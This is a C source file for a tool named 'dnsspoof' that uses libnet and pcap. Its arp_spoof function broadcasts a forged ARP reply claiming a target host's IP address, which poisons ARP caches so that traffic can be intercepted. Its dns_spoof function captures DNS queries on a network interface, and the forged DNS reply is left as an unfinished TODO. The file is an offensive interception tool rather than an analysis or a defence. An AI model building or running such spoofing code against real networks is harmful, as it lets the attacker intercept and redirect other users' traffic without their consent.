/*
 * Copyright (C) 2017 Jan Pawlak, Piotr Markowski
 *
 * Compilation:  make
 * Usage:        ./dnsspoof HOST INTERFACE
 * NOTE:         This program requires root privileges.
 *
 */

#include <libnet.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define ETH_ADDR_SIZE 6

void arp_spoof(char *host, char *interface){
  	libnet_t *ln;
	u_int32_t target_ip_addr, zero_ip_addr;
  	u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
           	zero_hw_addr[6]  = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  	struct libnet_ether_addr* src_hw_addr;
  	char errbuf[LIBNET_ERRBUF_SIZE];

  	if ((ln = libnet_init(LIBNET_LINK, interface, errbuf)) == NULL){
		printf("arp_spoof: error initializing libnet: %s\n", errbuf);
		exit(-1);
	}
  	if ((src_hw_addr = libnet_get_hwaddr(ln)) == NULL){
		printf("arp_spoof: failed to get MAC address\n");
		exit(-1);
	}
  	if ((target_ip_addr = libnet_name2addr4(ln, host, LIBNET_RESOLVE)) == -1){
		printf("arp_spoof: failed to get IPv4 address of HOST\n");
	}
  	zero_ip_addr = libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE);
  	libnet_autobuild_arp(
    		ARPOP_REPLY,                     /* operation type       */
    		src_hw_addr->ether_addr_octet,   /* sender hardware addr */
    		(u_int8_t*) &target_ip_addr,     /* sender protocol addr */
    		zero_hw_addr,                    /* target hardware addr */
    		(u_int8_t*) &zero_ip_addr,       /* target protocol addr */
    		ln);                             /* libnet context       */
  	libnet_autobuild_ethernet(
    		bcast_hw_addr,                   /* ethernet destination */
    		ETHERTYPE_ARP,                   /* ethertype            */
   		ln);                             /* libnet context       */
  	libnet_write(ln);
	libnet_destroy(ln);
}

struct ethhdr{
	u_char eth_dst[ETH_ADDR_SIZE];
	u_char eth_src[ETH_ADDR_SIZE];
	u_short ether_type;
};

struct dnshdr{
	char id[2];
	char flags[2];
	char qdcount[2];
	char ancount[2];
	char nscount[2];
	char arcount[2];
};

struct dnsquery{
	char *qname;
	char qtype[2];
	char qclass[2];
};

void process_dns_query(const u_char *packet, struct dnshdr **dns_hdr, struct dnsquery *dns_query){
	struct ethhdr *eth;
	struct iphdr *ip;
	struct udphdr *udp;

	eth = (struct ethhdr*)(packet);
	ip = (struct iphdr*)(((char*) eth) + sizeof(struct ethhdr));
	//TODO: extract src and dest ip
	unsigned int ip_hdr_size = ip->ihl*4;
	udp = (struct udphdr *)(((char*) ip) + ip_hdr_size);
	//TODO: extract port from udp

	*dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));
	dns_query -> qname = ((char*) *dns_hdr) + sizeof(struct dnshdr);
}

void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes){
	printf("%dB of %dB\n", h->caplen, h-> len);
	
	struct dnshdr *dns_hdr;
	struct dnsquery dns_query;
	
	process_dns_query(bytes, &dns_hdr, &dns_query);
	printf("Captured query: %s\n", dns_query.qname);

	//TODO: build and send fake answer
}

void dns_spoof(char *host, char *interface){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle;
	char filter[32];
	struct bpf_program fp;

	memset(errbuf, 0, PCAP_ERRBUF_SIZE);
	if ((handle = pcap_open_live(interface, 1500, 1, 0, errbuf)) == NULL || strlen(errbuf) > 0){
		printf("dns_spoof: error initializing pcap: %s\n", errbuf);
		exit(-1);
	}

	sprintf(filter, "udp and dst port domain");	//Filter DNS queries

	if (pcap_compile(handle, &fp, filter, 0, 0) == -1){
		printf("dns_spoof: error compiling filter: %s\n", pcap_geterr(handle));
		exit(-1);
	}
	if (pcap_setfilter(handle, &fp) == -1){
		printf("dns_spoof: error setting filter: %s\n", pcap_geterr(handle));
	}
	
	pcap_loop(handle, -1, trap, (u_char*)host);
	
	pcap_freecode(&fp);
	pcap_close(handle);
}

int main(int argc, char** argv) {
  	if (argc < 3){
		printf("Usage: %s HOST INTERFACE\n", argv[0]);
		exit(-1);
	}
  	arp_spoof(argv[1], argv[2]);
	dns_spoof(argv[1], argv[2]);
	
  	return EXIT_SUCCESS;
}
